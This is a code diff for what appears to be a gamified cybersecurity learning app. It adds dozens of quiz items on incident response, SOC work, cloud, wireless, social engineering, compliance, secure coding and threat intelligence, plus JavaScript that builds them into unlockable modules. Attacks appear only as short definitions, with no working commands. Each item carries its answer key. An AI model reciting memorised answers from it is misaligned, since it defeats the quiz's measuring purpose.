+            ["Ch. 20 — Digital Forensics & IR","Timeline Analysis","A timeline orders events so analysts can reconstruct the sequence of an intrusion.","A forensic timeline helps analysts do what?",["Order events to reconstruct what happened","Encrypt evidence","Block attackers","Patch systems"],0,"Before and after, in order."],
+            ["Ch. 20 — Digital Forensics & IR","The IR Lifecycle","PICERL: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.","Which is the correct IR phase order?",["Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned","Identification, Recovery, Containment, Preparation","Containment, Preparation, Recovery, Identification","Eradication, Identification, Recovery, Containment"],0,"Prepare first, learn last."],
+            ["Ch. 20 — Digital Forensics & IR","Containment","Containment stops the spread and limits damage while investigation continues.","The goal of containment is to do what?",["Stop the spread and limit damage","Remove the threat permanently","Restore services","Write the report"],0,"Stop the bleeding first."],
+            ["Ch. 20 — Digital Forensics & IR","Eradication","Eradication removes the threat and its persistence mechanisms from the environment.","Eradication involves what?",["Removing the threat and its persistence mechanisms","Restoring from backup","Isolating hosts","Notifying customers"],0,"Delete the intruder, not just the door."],
+            ["Ch. 20 — Digital Forensics & IR","Lessons Learned","The post-incident review should improve defences and update playbooks.","The lessons-learned phase should do what?",["Improve defences and update playbooks","Assign blame","Close the ticket only","Delete evidence"],0,"Every incident is free training."],
+            ["Ch. 20 — Digital Forensics & IR","SIEM Basics","A SIEM aggregates and correlates logs to surface meaningful alerts.","A SIEM primarily does what?",["Aggregates and correlates logs to raise alerts","Encrypts disks","Scans for vulnerabilities","Manages patches"],0,"Central collection plus correlation."],
+            ["Ch. 20 — Digital Forensics & IR","Anti-Forensics","Timestomping alters file timestamps to mislead investigators.","Timestomping is an anti-forensic technique that does what?",["Alters file timestamps to mislead investigators","Encrypts the disk","Deletes the OS","Blocks ports"],0,"It attacks the timeline."],
+
+            ["Ch. 21 — Blue Team & SOC Operations","SOC Tiers","Tier 1 analysts triage and escalate alerts to more senior tiers.","A SOC Tier 1 analyst mainly does what?",["Triages and escalates alerts","Performs reverse engineering","Writes detection rules","Manages SIEM infrastructure"],0,"First eyes on every alert."],
+            ["Ch. 21 — Blue Team & SOC Operations","False Positives","A false positive is an alert raised for benign activity.","A false positive is what?",["An alert for benign activity","A missed attack","A blocked attack","A failed login"],0,"Noise that wastes analyst time."],
+            ["Ch. 21 — Blue Team & SOC Operations","False Negatives","A false negative is a real attack that went undetected.","A false negative is what?",["A real attack that was not detected","A benign alert","A blocked scan","A patched host"],0,"The dangerous one."],
+            ["Ch. 21 — Blue Team & SOC Operations","Detection Engineering","Detection engineers write, test and tune the logic that produces alerts.","Detection engineering focuses on what?",["Writing and tuning reliable detection logic","Patching servers","Managing users","Buying tools"],0,"Good detections beat more tools."],
+            ["Ch. 21 — Blue Team & SOC Operations","Sigma Rules","Sigma provides vendor-neutral detection rule format that converts to many SIEMs.","Sigma rules are what?",["Vendor-neutral detection rules","Firewall rules","Encryption algorithms","Backup scripts"],0,"Write once, deploy anywhere."],
+            ["Ch. 21 — Blue Team & SOC Operations","MITRE ATT&CK","ATT&CK is a knowledge base of adversary tactics and techniques.","MITRE ATT&CK is what?",["A knowledge base of adversary tactics and techniques","A penetration testing tool","A firewall","A compliance standard"],0,"It maps behaviour, not just tools."],
+            ["Ch. 21 — Blue Team & SOC Operations","Threat Hunting","Threat hunting is the proactive search for threats that evaded existing detections.","Threat hunting is what?",["Proactively searching for undetected threats","Waiting for alerts","Running antivirus scans","Patching systems"],0,"Assume breach and go looking."],
+            ["Ch. 21 — Blue Team & SOC Operations","EDR","EDR provides endpoint telemetry, detection and response capabilities.","EDR provides what?",["Endpoint telemetry, detection and response capability","Network routing","Disk encryption","Email filtering only"],0,"It sees process behaviour, not just files."],
+            ["Ch. 21 — Blue Team & SOC Operations","Honeypots","A honeypot is a decoy system designed to attract and observe attackers.","A honeypot is what?",["A decoy system designed to attract and observe attackers","A backup server","A VPN","A password vault"],0,"Any interaction is suspicious by definition."],
+            ["Ch. 21 — Blue Team & SOC Operations","SOAR","SOAR platforms automate and orchestrate response workflows across tools.","SOAR platforms do what?",["Automate and orchestrate response workflows","Replace firewalls","Encrypt endpoints","Manage DNS"],0,"Machines handle the repetitive steps."],
+            ["Ch. 21 — Blue Team & SOC Operations","Playbooks","An IR playbook gives step-by-step procedures for a specific incident type.","An IR playbook provides what?",["Step-by-step procedures for handling a specific incident type","A list of employees","A network diagram","A budget plan"],0,"Decide once, execute every time."],
+            ["Ch. 21 — Blue Team & SOC Operations","MTTD and MTTR","MTTD measures time to detect, and MTTR measures time to respond and recover.","MTTD measures what?",["Mean time to detect","Mean time to deploy","Maximum transfer rate","Managed threat data"],0,"Faster detection shrinks the blast radius."],
+            ["Ch. 21 — Blue Team & SOC Operations","Tabletop Exercises","A tabletop is a discussion-based simulation of an incident scenario.","A tabletop exercise is what?",["A discussion-based simulation of an incident","A live penetration test","A backup drill only","A code review"],0,"Cheap rehearsal for an expensive day."],
+            ["Ch. 21 — Blue Team & SOC Operations","Purple Teaming","Purple teaming pairs offensive and defensive teams to improve detection together.","Purple teaming combines what?",["Offensive and defensive teams working together to improve detection","Two red teams","Two blue teams","Compliance and audit"],0,"Attack to improve defence."],
+
+            ["Ch. 22 — Cloud & Container Security","Shared Responsibility","In the cloud, the customer always owns their data, identities and configuration.","In the shared responsibility model, the customer is always responsible for what?",["Their data, identities and configuration","Physical datacentre security","Hypervisor patching","Network hardware"],0,"The provider secures the cloud; you secure what is in it."],
+            ["Ch. 22 — Cloud & Container Security","IAM Least Privilege","Cloud IAM policies should grant only the permissions each identity actually needs.","Cloud IAM policies should follow which principle?",["Least privilege","Allow-all for speed","Shared root accounts","No MFA"],0,"Wildcard actions are how breaches spread."],
+            ["Ch. 22 — Cloud & Container Security","Public Buckets","A publicly writable object store bucket can leak data and host malware.","A publicly writable cloud storage bucket can lead to what?",["Data theft and malware hosting","Faster downloads","Better availability","Lower costs"],0,"Storage misconfiguration is the classic cloud breach."],
+            ["Ch. 22 — Cloud & Container Security","Security Groups","Security groups act as virtual stateful firewalls attached to cloud resources.","A security group acts as what?",["A virtual stateful firewall for cloud instances","A DNS zone","A load balancer","A backup policy"],0,"Rules in, rules out."],
+            ["Ch. 22 — Cloud & Container Security","VPCs","A Virtual Private Cloud is an isolated virtual network within a provider.","A VPC provides what?",["An isolated virtual network in the cloud","A physical datacentre","A container runtime","A key vault"],0,"Your own private slice of the cloud."],
+            ["Ch. 22 — Cloud & Container Security","Secrets Management","Secrets belong in a managed vault with rotation, never in source code.","Secrets should be stored where?",["In a managed secrets vault, not in code","In Git for versioning","In environment files committed to the repo","In emails"],0,"Repositories are forever."],
+            ["Ch. 22 — Cloud & Container Security","Containers vs VMs","Containers share the host kernel and isolate at the process level.","Containers differ from VMs because they do what?",["Share the host kernel and isolate at process level","Require a full guest OS","Cannot be orchestrated","Are always more secure"],0,"Smaller, faster, weaker boundary."],
+            ["Ch. 22 — Cloud & Container Security","Kubernetes RBAC","RBAC controls which identities can perform which actions on cluster resources.","Kubernetes RBAC controls what?",["Who can perform which actions on cluster resources","Pod CPU limits","Container images","Node hardware"],0,"Cluster permissions are the new domain admin."],
+            ["Ch. 22 — Cloud & Container Security","Image Scanning","Scanning container images finds known vulnerabilities in packages and base layers.","Container image scanning finds what?",["Known vulnerabilities in packages and base images","Runtime intrusions only","Network misconfigurations","IAM policies"],0,"Patch the base, patch everything above it."],
+            ["Ch. 22 — Cloud & Container Security","Serverless Risks","Over-privileged roles and injection flaws in event handlers are the main risks.","Serverless functions are risky when what is true?",["Over-privileged roles and injection flaws exist in event handlers","They scale too fast","They use HTTPS","They are stateless"],0,"No server to patch does not mean no code to secure."],
+            ["Ch. 22 — Cloud & Container Security","CSPM","Cloud security posture management continuously checks configuration against best practice.","CSPM tools are used to do what?",["Continuously assess cloud configuration against best practice","Scan containers at runtime","Crack passwords","Manage DNS"],0,"Drift detection for your cloud config."],
+            ["Ch. 22 — Cloud & Container Security","Metadata Service Abuse","SSRF to the instance metadata endpoint can leak temporary cloud credentials.","SSRF to 169.254.169.254 can expose what?",["Cloud instance credentials from the metadata service","DNS records","TLS keys only","Backup files"],0,"The IMDS is a credential vending machine."],
+            ["Ch. 22 — Cloud & Container Security","Infrastructure as Code","IaC scanning catches misconfigurations before anything is deployed.","Scanning infrastructure-as-code catches what?",["Misconfigurations before deployment","Runtime malware","Phishing emails","DDoS attacks"],0,"Fix it in the pull request, not production."],
+            ["Ch. 22 — Cloud & Container Security","Cloud Audit Logs","AWS CloudTrail records API activity and account events for auditing.","AWS CloudTrail records what?",["API activity and account events","Disk writes","Network packets","User keystrokes"],0,"Who did what, to which resource, when."],
+
+            ["Ch. 23 — Wireless, Mobile & IoT Security","WEP is Broken","WEP uses RC4 with weak IVs and its key can be recovered in minutes.","WEP is insecure because of what?",["Its RC4-based key can be recovered quickly","It has no password","It is asymmetric","It uses 4096-bit keys"],0,"Never use WEP for anything."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","The WPA2 Handshake","Capturing the four-way handshake allows offline cracking of the PSK.","Capturing the WPA2 four-way handshake allows what?",["Offline cracking of the pre-shared key","Immediate decryption of all traffic","Bypassing the firewall","Reading hashes only"],0,"Crack at leisure, offline."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","WPA3 and SAE","WPA3 replaces the PSK handshake with SAE, resisting offline dictionary attacks.","WPA3 improves on WPA2 mainly with what?",["SAE, which resists offline dictionary attacks","Longer SSIDs","Faster speeds","No encryption"],0,"Simultaneous Authentication of Equals."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","Deauthentication Attacks","Deauth frames force clients off an AP, often to capture a handshake.","A deauthentication attack does what?",["Forcibly disconnects clients from an AP","Encrypts the network","Blocks DNS","Steals cookies"],0,"Forge a management frame, cause chaos."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","PMKID Attacks","The PMKID attack cracks the PSK without capturing a full handshake.","The PMKID attack allows cracking without what?",["Capturing a full four-way handshake","Any wireless adapter","Being in range","Knowing the SSID"],0,"One frame from the AP is enough."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","Captive Portals","Users frequently connect to look-alike captive portals and hand over credentials.","A captive portal is a risk because of what?",["Users may connect to a malicious look-alike portal","It encrypts traffic","It requires certificates","It blocks ads"],0,"Free Wi-Fi is rarely free."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","Bluetooth Attacks","Bluesnarfing is unauthorised access to data over a Bluetooth connection.","Bluesnarfing is what?",["Unauthorised access to data over Bluetooth","A Wi-Fi attack","An email attack","A USB attack"],0,"Short range does not mean safe."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","SIM Swapping","A SIM swap lets an attacker receive the victim's SMS-based MFA codes.","A SIM swap attack lets an attacker do what?",["Receive the victim's SMS-based MFA codes","Decrypt TLS","Read emails offline","Clone a laptop"],0,"SMS MFA is only as strong as your carrier."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","App Permissions","Excessive mobile app permissions lead to privacy loss and data harvesting.","Excessive mobile app permissions can lead to what?",["Privacy loss and data harvesting","Faster battery drain only","Better performance","Stronger encryption"],0,"Why does a torch app need your contacts?"],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","MDM","Mobile device management enforces policy, remote wipe and configuration.","MDM solutions allow organisations to do what?",["Enforce policy, wipe and manage mobile devices","Block all Wi-Fi","Encrypt the internet","Replace antivirus"],0,"Corporate control for BYOD."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","Jailbreaking Risks","A jailbroken device weakens the OS security model and may break management.","A jailbroken or rooted device does what?",["Weakens the OS security model","Is always faster","Cannot be managed","Has no apps"],0,"You removed the sandbox."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","IoT Default Credentials","The biggest IoT problem is default credentials combined with no patch path.","The biggest IoT security problem is what?",["Default credentials and no patch path","Too much encryption","High cost","Slow CPUs"],0,"admin / admin, forever."],
+            ["Ch. 23 — Wireless, Mobile & IoT Security","The Mirai Botnet","Mirai recruited IoT devices using default credentials into a massive DDoS botnet.","The Mirai botnet was built from what?",["Compromised IoT devices with default credentials","Windows servers","Phones","Routers only"],0,"Millions of cameras and routers as soldiers."],
+
+            ["Ch. 24 — Social Engineering","Phishing","Phishing uses deceptive messages to trick users into revealing information.","Phishing is what?",["Deceptive messaging that tricks users into revealing information","A network scan","A type of malware","A firewall bypass"],0,"It targets the human, not the machine."],
+            ["Ch. 24 — Social Engineering","Spear Phishing","Spear phishing is highly targeted at specific individuals using researched detail.","Spear phishing differs because it is what?",["Highly targeted at specific individuals","Sent to millions","Always by phone","Only via SMS"],0,"Personalisation makes it convincing."],
+            ["Ch. 24 — Social Engineering","Whaling","Whaling targets senior executives and high-value decision makers.","Whaling targets whom?",["Senior executives","Children","IT interns","Public Wi-Fi"],0,"Big fish, big payoff."],
+            ["Ch. 24 — Social Engineering","Vishing","Vishing is social engineering conducted over voice calls.","Vishing is social engineering via what?",["Voice calls","Email","SMS","Fax"],0,"A real human on the phone."],
+            ["Ch. 24 — Social Engineering","Smishing","Smishing is phishing delivered through SMS text messages.","Smishing is delivered through what?",["SMS text messages","Voice calls","Physical mail","QR codes only"],0,"Short links and urgency."],
+            ["Ch. 24 — Social Engineering","Pretexting","Pretexting invents a believable scenario to justify a request for information.","Pretexting involves what?",["Inventing a believable scenario to extract information","Technical exploitation","Password cracking","Packet sniffing"],0,"The story is the exploit."],
+            ["Ch. 24 — Social Engineering","Baiting","Baiting exploits curiosity, such as a dropped USB drive in a car park.","Baiting attacks exploit what?",["Curiosity, such as a dropped USB drive","Fear of authority","Greed for money","Technical flaws"],0,"The lure does the work."],
+            ["Ch. 24 — Social Engineering","Tailgating","Tailgating means following an authorised person into a restricted area.","Tailgating is what?",["Following an authorised person into a restricted area","Sending fake invoices","Cloning a badge","Spoofing DNS"],0,"Physical access is still access."],
+            ["Ch. 24 — Social Engineering","Quid Pro Quo","Quid pro quo offers a service or favour in exchange for information.","Quid pro quo social engineering offers what?",["A service or favour in exchange for information","A threat","A malware download","A fake login page"],0,"I will fix your computer if you tell me your password."],
+            ["Ch. 24 — Social Engineering","Watering Hole","A watering hole attack compromises a site the target group is known to visit.","A watering hole attack compromises what?",["A site the target group is known to visit","The victim's router","The DNS root","The email server"],0,"Poison the watering hole, catch the herd."],
+            ["Ch. 24 — Social Engineering","Deepfakes","Cloned voices and video are increasingly used to impersonate executives.","Deepfake voice cloning is dangerous because of what?",["It can impersonate executives convincingly","It is easy to detect","It needs no data","It only affects video"],0,"Verify out of band, always."],
+            ["Ch. 24 — Social Engineering","Awareness Training","The strongest control against social engineering is a trained, reporting-friendly workforce.","The most effective control against social engineering is what?",["Ongoing security awareness training and a report-friendly culture","Stronger firewalls","Longer passwords","More antivirus"],0,"People are the target and the defence."],
+
+            ["Ch. 25 — Governance, Risk & Compliance","The CIA Triad","Confidentiality, Integrity and Availability are the three pillars of security.","The CIA triad stands for what?",["Confidentiality, Integrity, Availability","Control, Inspection, Audit","Compliance, Identity, Access","Cryptography, Isolation, Authentication"],0,"Every control maps to one of these."],
+            ["Ch. 25 — Governance, Risk & Compliance","Least Privilege","Least privilege means users receive only the access their role requires.","Least privilege means what?",["Users get only the access required for their role","Everyone is an admin","Access is granted by default","Passwords are shared"],0,"Minimum necessary, nothing more."],
+            ["Ch. 25 — Governance, Risk & Compliance","Defence in Depth","Layering independent controls means no single failure is fatal.","Defence in depth means what?",["Layering multiple independent controls","Relying on one strong control","Buying more tools","Outsourcing security"],0,"Assume each layer will fail."],
+            ["Ch. 25 — Governance, Risk & Compliance","Defining Risk","Risk is generally expressed as likelihood multiplied by impact.","Risk is generally expressed as what?",["Likelihood multiplied by impact","Cost divided by time","Assets minus threats","Controls plus vulnerabilities"],0,"How likely, how bad."],
+            ["Ch. 25 — Governance, Risk & Compliance","Qualitative vs Quantitative","Quantitative analysis assigns numeric values such as monetary loss.","Quantitative risk analysis does what?",["Uses numeric values such as monetary loss","Uses only opinions","Cannot be reported","Ignores impact"],0,"Numbers executives can budget against."],
+            ["Ch. 25 — Governance, Risk & Compliance","GDPR","GDPR protects the personal data of people in the European Union.","GDPR primarily protects what?",["Personal data of EU residents","Financial transactions","Health records only","Government networks"],0,"It is about data subjects and their rights."],
+            ["Ch. 25 — Governance, Risk & Compliance","PCI DSS","PCI DSS applies wherever cardholder data is stored, processed or transmitted.","PCI DSS applies to organisations that do what?",["Store, process or transmit cardholder data","Use cloud services","Have employees","Run websites"],0,"If you touch card data, you are in scope."],
+            ["Ch. 25 — Governance, Risk & Compliance","HIPAA","HIPAA governs the handling of protected health information in the United States.","HIPAA governs what?",["Protected health information in the US","EU privacy","Payment cards","Financial reporting"],0,"Health data has its own rulebook."],
+            ["Ch. 25 — Governance, Risk & Compliance","ISO 27001","ISO 27001 defines requirements for an information security management system.","ISO 27001 is what?",["An international standard for information security management systems","A penetration testing tool","A firewall standard","A programming language"],0,"It is about management, not just controls."],
+            ["Ch. 25 — Governance, Risk & Compliance","The NIST CSF","The NIST Cybersecurity Framework has five core functions: Identify, Protect, Detect, Respond, Recover.","What are the NIST CSF core functions?",["Identify, Protect, Detect, Respond, Recover","Plan, Do, Check, Act","Confidentiality, Integrity, Availability","Prevent, Detect, Correct"],0,"Five verbs that cover the lifecycle."],
+            ["Ch. 25 — Governance, Risk & Compliance","SOC 2","SOC 2 reports against trust services criteria such as security and availability.","SOC 2 reports focus on what?",["Trust services criteria such as security and availability","Financial statements","Employee conduct","Product quality"],0,"It is an attestation, not a certification."],
+            ["Ch. 25 — Governance, Risk & Compliance","Pentest vs Vulnerability Scan","A scan identifies potential issues; a pentest tries to exploit them.","A vulnerability scan differs from a penetration test because it does what?",["Identifies potential issues without exploiting them","Always gains domain admin","Is manual only","Requires no scope"],0,"Automated breadth versus manual depth."],
+            ["Ch. 25 — Governance, Risk & Compliance","Business Continuity","A BCP keeps critical operations running through disruption and disaster.","A business continuity plan focuses on what?",["Keeping critical operations running during disruption","Patching servers","Hiring staff","Marketing"],0,"Keep the lights on, whatever happens."],
+            ["Ch. 25 — Governance, Risk & Compliance","Security Policy","A security policy states management intent and mandatory requirements.","A security policy is what?",["A high-level statement of management intent and requirements","A firewall rule","A script","A log file"],0,"Policy is the why and the must."],
+
+            ["Ch. 26 — Secure Coding & DevSecOps","Input Validation","Allow-list validation is far stronger than trying to block known-bad input.","Input validation should be what?",["Allow-list based where possible","Blacklist based only","Done client-side only","Skipped for internal APIs"],0,"Define what is allowed, reject the rest."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Output Encoding","Encoding output for its destination context prevents injection into interpreters.","Output encoding prevents what?",["Injection into HTML, JavaScript, SQL and other interpreters","Disk failure","DDoS","Phishing"],0,"Encode for HTML, JS, SQL or URL, as appropriate."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Hardcoded Secrets","Secrets committed to source control are effectively published forever.","Hardcoded credentials in source code are dangerous because of what?",["Anyone with repo access can use them","They slow the build","They break tests","They are illegal"],0,"History is forever, even after deletion."],
+            ["Ch. 26 — Secure Coding & DevSecOps","SAST","Static application security testing analyses source code without executing it.","SAST analyses what?",["Source code without running it","Running applications","Network traffic","Container images"],0,"Find it before it compiles."],
+            ["Ch. 26 — Secure Coding & DevSecOps","DAST","Dynamic application security testing probes a running application from outside.","DAST analyses what?",["A running application from the outside","Source code","Dependencies","Infrastructure as code"],0,"Attack the deployed target."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Software Composition Analysis","SCA flags vulnerable third-party libraries and licence issues.","Software composition analysis finds what?",["Vulnerable third-party dependencies","Logic bugs in your own code","Network misconfigurations","Weak passwords"],0,"Most of your code is not yours."],
+            ["Ch. 26 — Secure Coding & DevSecOps","SBOM","A software bill of materials is a machine-readable inventory of components.","An SBOM is what?",["A machine-readable inventory of software components","A backup format","A firewall rule set","A testing framework"],0,"You cannot patch what you cannot list."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Pipeline Security","Compromising CI/CD grants an attacker code execution in production.","CI/CD pipelines must be protected because of what?",["Compromise gives attackers code execution in production","They are slow","They use YAML","They are public"],0,"The pipeline is production's front door."],
+            ["Ch. 26 — Secure Coding & DevSecOps","STRIDE","STRIDE is a threat modelling framework covering six threat categories.","STRIDE is used for what?",["Threat modelling","Penetration testing","Hashing","Log analysis"],0,"Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Shifting Left","Shifting left means integrating security earlier in the development lifecycle.","Shifting left means what?",["Integrating security earlier in the development lifecycle","Moving servers","Delaying releases","Outsourcing security"],0,"Cheaper to fix in design than in production."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Web Application Firewalls","A WAF filters HTTP traffic against known attack patterns as a compensating control.","A WAF protects by doing what?",["Filtering HTTP traffic for known attack patterns","Encrypting disks","Scanning source code","Managing identities"],0,"It buys time, it is not a fix."],
+            ["Ch. 26 — Secure Coding & DevSecOps","Error Handling","Verbose errors leak stack traces, versions and internal paths to attackers.","Verbose error messages are risky because of what?",["They leak internal details useful to attackers","They slow the app","They break logging","They are illegal"],0,"Log detail internally, show generic messages externally."],
+
+            ["Ch. 27 — Threat Intelligence","IOCs vs TTPs","TTPs describe behaviour and are far harder for an adversary to change than IOCs.","TTPs are more valuable than IOCs because of what?",["They describe behaviour that is harder for attackers to change","They are easier to collect","They are always public","They need no analysis"],0,"Behaviour outlives infrastructure."],
+            ["Ch. 27 — Threat Intelligence","Advanced Persistent Threats","An APT is a well-resourced, persistent intruder, often linked to a state.","An APT is what?",["A well-resourced, persistent intruder often linked to a state","A single virus","A firewall rule","A vulnerability scanner"],0,"Patient, funded, and focused."],
+            ["Ch. 27 — Threat Intelligence","The Cyber Kill Chain","The kill chain models intrusion stages from reconnaissance to actions on objectives.","The Cyber Kill Chain describes what?",["Stages of an intrusion from recon to actions on objectives","Encryption algorithms","Firewall states","Patch levels"],0,"Break any link to break the attack."],
+            ["Ch. 27 — Threat Intelligence","The Diamond Model","The Diamond Model uses adversary, capability, infrastructure and victim.","The Diamond Model has four core features: adversary, capability, infrastructure and what?",["Victim","Vulnerability","Vector","Verdict"],0,"Four corners, one intrusion event."],
+            ["Ch. 27 — Threat Intelligence","STIX and TAXII","STIX describes threat intel and TAXII transports it between systems.","STIX and TAXII are used to do what?",["Represent and exchange threat intelligence","Encrypt email","Scan ports","Hash passwords"],0,"A common language and a common pipe."],
+            ["Ch. 27 — Threat Intelligence","Attribution Difficulty","Proxies, false flags and shared tooling make attribution genuinely hard.","Attribution in cyber is difficult because of what?",["Attackers can use proxies, false flags and shared tooling","Logs do not exist","IPs are private","Encryption is weak"],0,"Tools are shared; motives are not."],
+            ["Ch. 27 — Threat Intelligence","Hacktivists","Hacktivists are primarily motivated by ideology or political goals.","A hacktivist is motivated primarily by what?",["Ideology or political goals","Money","Espionage","Fun"],0,"The message is the point."],
+            ["Ch. 27 — Threat Intelligence","Crime-as-a-Service","Criminal markets sell access, malware, phishing kits and ransomware on subscription.","Cybercrime-as-a-service refers to what?",["Criminal markets selling access, malware and tooling","Cloud providers","Managed security services","Government CERTs"],0,"You do not need skill, just budget."],
+            ["Ch. 27 — Threat Intelligence","Nation-State Actors","State actors prioritise espionage, disruption and long-term persistent access.","Nation-state actors typically prioritise what?",["Espionage, disruption and long-term access","Petty theft","Spam","Ad fraud"],0,"Strategic, not opportunistic."],
+            ["Ch. 27 — Threat Intelligence","Zero-Days","A zero-day is a vulnerability for which no vendor patch yet exists.","A zero-day is what?",["A vulnerability with no vendor patch available","A patched flaw","A type of malware","An expired certificate"],0,"Defenders have no signature yet."],
+            ["Ch. 27 — Threat Intelligence","Threat Feeds","Feeds supply indicators and context about current threats for detection use.","A threat intelligence feed provides what?",["Indicators and context about current threats","Software patches","Firewall rules","Backups"],0,"Context beats raw indicator dumps."],
+            ["Ch. 27 — Threat Intelligence","Dark Web Monitoring","Monitoring criminal forums surfaces leaked credentials and data for sale.","Dark web monitoring helps organisations do what?",["Detect leaked credentials and data for sale","Speed up the internet","Encrypt traffic","Block malware"],0,"Find out before the attacker does."],
+
+            ["Ch. 28 — Career & Professional Practice","CompTIA Security+","Security+ is an entry-level certification covering core security concepts.","CompTIA Security+ is best described as what?",["An entry-level foundational certification","An expert-level offensive cert","A cloud vendor cert","A management-only cert"],0,"A solid first rung on the ladder."],
+            ["Ch. 28 — Career & Professional Practice","OSCP","The OSCP is a hands-on practical exam requiring exploitation within 24 hours.","The OSCP is known for what?",["A hands-on 24-hour practical exploitation exam","Multiple-choice theory","Cloud architecture","Audit reporting only"],0,"Try harder is the motto."],
+            ["Ch. 28 — Career & Professional Practice","CISSP","CISSP targets experienced practitioners moving into leadership roles.","CISSP is aimed at whom?",["Experienced security leaders and managers","Absolute beginners","Hardware technicians","Helpdesk staff"],0,"Five years of experience is expected."],
+            ["Ch. 28 — Career & Professional Practice","Home Labs","A home lab lets you practise attacks and defences safely and repeatedly.","A home lab helps you do what?",["Practise attacks and defences safely","Get a faster internet connection","Avoid certifications","Replace work experience"],0,"Build it, break it, rebuild it."],
+            ["Ch. 28 — Career & Professional Practice","CTF Competitions","Capture the flag events build practical, adversarial problem-solving skills.","CTF competitions are useful for what?",["Building practical problem-solving skills","Learning marketing","Practising typing","Networking only"],0,"Puzzles that teach real technique."],
+            ["Ch. 28 — Career & Professional Practice","Bug Bounties","Bug bounty programs pay researchers for valid, in-scope vulnerability reports.","Bug bounty programs pay whom?",["Researchers who report valid vulnerabilities within scope","For every scan run","For writing malware","For social media posts"],0,"Read the scope before you touch anything."],
+            ["Ch. 28 — Career & Professional Practice","Report Writing","A strong report explains business impact and gives actionable remediation.","A good penetration test report does what?",["Explains impact and gives actionable remediation","Lists only tool output","Hides findings","Uses maximum jargon"],0,"Nobody buys a raw tool dump."],
+            ["Ch. 28 — Career & Professional Practice","Rules of Engagement","Rules of engagement define scope, timing and permitted techniques.","Rules of engagement define what?",["Scope, timing and permitted techniques","Your salary","The team structure","The tool vendors"],0,"Know the boundaries before you start."],
+            ["Ch. 28 — Career & Professional Practice","Professional Ethics","Findings outside scope should be reported through the agreed channel, never exploited.","If you discover a vulnerability outside scope you should do what?",["Stop and report it through the agreed channel","Exploit it to prove a point","Publish it immediately","Sell it"],0,"Trust is the whole profession."],
+            ["Ch. 28 — Career & Professional Practice","Continuous Learning","Continuous hands-on practice and reading keeps skills current in a fast field.","The most reliable way to stay current is what?",["Continuous hands-on practice and reading","One certification only","Waiting for employer training","Relying on vendor marketing"],0,"The field never stops moving."]
+        ];
+
+        const GEN_ID_START = 100;
+        const GEN_ICONS = ['fa-network-wired','fa-terminal','fa-shield-halved','fa-bug','fa-lock','fa-cloud','fa-magnifying-glass','fa-code','fa-user-secret','fa-database','fa-satellite-dish','fa-fingerprint'];
+
+        const generatedNodes = CURRICULUM.map(function(row, i) {
+            const chapter = row[0], title = row[1], body = row[2], question = row[3], options = row[4], answer = row[5], hint = row[6];
+            const id = GEN_ID_START + i;
+            const isLast = (i === CURRICULUM.length - 1);
+            const tier = Math.floor(i / 25);
+
+            return {
+                id: id,
+                chapter: chapter,
+                title: title,
+                type: 'quiz',
+                icon: GEN_ICONS[i % GEN_ICONS.length],
+                unlocks: isLast ? [] : [id + 1],
+                desc: body,
+                content: `<p class="text-lg text-term-green mb-4">${body}</p>
+                          <div class="bg-term-black border border-term-gray rounded p-4 mt-6 text-xs font-sans text-term-light/70">
+                              <span class="text-term-cyan uppercase tracking-widest">Extended Database</span> &nbsp;·&nbsp;
+                              Module ${i + 1} of ${CURRICULUM.length} &nbsp;·&nbsp; ${chapter}
+                          </div>`,
+                question: question,
+                options: options,
+                answer: answer,
+                hint: hint,
+                rewards: { xp: 40 + tier * 10, credits: 20 + tier * 5 }
+            };
+        });
+
+        mapNodes.forEach(function(n) { if (!n.chapter) n.chapter = 'Ch. 00 — Core Foundations'; });
+
+        const tailNode = mapNodes.find(function(n) { return n.id === 12; });
+        if (tailNode) tailNode.unlocks = [GEN_ID_START];
+
+        const allNodes = mapNodes.concat(generatedNodes);
+
+        function getNode(id) {
+            return allNodes.find(function(n) { return n.id === id; });
+        }
+
+        let currentActiveModule = null;
+        let currentTerminalInstance = null;
+
+        function switchView(viewId) {
+            document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
+            document.getElementById(`view-${viewId}`).classList.remove('hidden');
+
+            document.querySelectorAll('.nav-btn').forEach(el => {
+                el.classList.remove('bg-term-gray', 'text-term-green', 'text-term-cyan');
+                el.classList.add('text-term-light');
+            });
+
+            let btn = document.getElementById(`nav-${viewId}`);
+            if(btn) {
+                btn.classList.add('bg-term-gray');
+                btn.classList.remove('text-term-light');
+                if(viewId === 'shop') btn.classList.add('text-term-cyan');
+                else btn.classList.add('text-term-green');
+            }
+
+            if(viewId === 'map') renderMap();
+            if(viewId === 'shop') renderShop();
+            if(viewId === 'inventory') renderInventory();
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toast');
+            const msg = document.getElementById('toast-msg');
+            const icon = document.getElementById('toast-icon');
+
+            msg.innerText = message;
+            toast.className = 'toast fixed top-4 right-4 z-50 bg-term-dark border px-6 py-4 rounded shadow-neon-green flex items-center gap-3 show';
+
+            if(type === 'success') {
+                toast.classList.add('border-term-green', 'text-term-green');
+                icon.className = 'fas fa-check-circle text-xl';
+            } else if (type === 'error') {
+                toast.classList.add('border-term-red', 'text-term-red', 'shadow-[0_0_15px_#ff003c]');
+                icon.className = 'fas fa-exclamation-triangle text-xl';
+            } else {
+                toast.classList.add('border-term-cyan', 'text-term-cyan');
+                icon.className = 'fas fa-info-circle text-xl';
+            }
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function updateStatsUI() {
